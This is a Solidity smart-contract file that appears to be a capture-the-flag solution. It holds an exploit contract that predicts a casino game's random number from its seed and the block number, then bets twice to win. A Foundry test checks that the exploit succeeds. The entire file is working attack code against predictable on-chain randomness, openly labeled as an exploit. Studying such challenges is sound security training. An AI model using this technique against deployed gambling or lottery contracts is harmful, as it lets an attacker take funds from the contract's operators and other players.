// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./Casino.sol";
import "forge-std/Test.sol";

/**
 * @title CasinoExploit
 * @notice Demonstrates how to win the vulnerable casino game with predictable RNG
 */
contract CasinoExploit {
    Casino public immutable casino;
    address public immutable attacker;

    event WinningNumberPredicted(uint256 predictedNumber, uint256 blockNumber);

    constructor(address casinoAddress) {
        casino = Casino(casinoAddress);
        attacker = msg.sender;
    }

    modifier onlyAttacker() {
        require(msg.sender == attacker, "Not authorized");
        _;
    }

    /**
     * @notice Predict the casino's next number
     * @return predictedNumber The number the casino will expect in this block
     */
    function predictNumber() public view returns (uint256 predictedNumber) {
        bytes32 seed = casino.getSeed();
        predictedNumber = uint256(keccak256(abi.encodePacked(seed, block.number))) ^ 0x539;
    }

    /**
     * @notice Execute the exploit and win twice in a row
     * @dev Winning twice unlocks the level because consecutiveWins > 1
     */
    function winTwice() external onlyAttacker {
        uint256 predictedNumber = predictNumber();
        emit WinningNumberPredicted(predictedNumber, block.number);

        casino.bet(predictedNumber);
        casino.bet(predictedNumber);
    }

    /**
     * @notice Check if challenge solved for this attacker
     * @return solved True if attacker has more than one consecutive win
     */
    function solved() external view returns (bool solved) {
        solved = casino.consecutiveWins(address(this)) > 1;
    }
}

contract CasinoExploitTest is Test {
    function testExploit() public {
        Casino casino = new Casino();
        CasinoExploit exploit = new CasinoExploit(address(casino));

        exploit.winTwice();

        assertEq(casino.consecutiveWins(address(exploit)), 2);
        assertTrue(exploit.solved());

        vm.prank(address(exploit));
        uint16[] memory result = casino.done();
        assertEq(result.length, 0);
    }
}
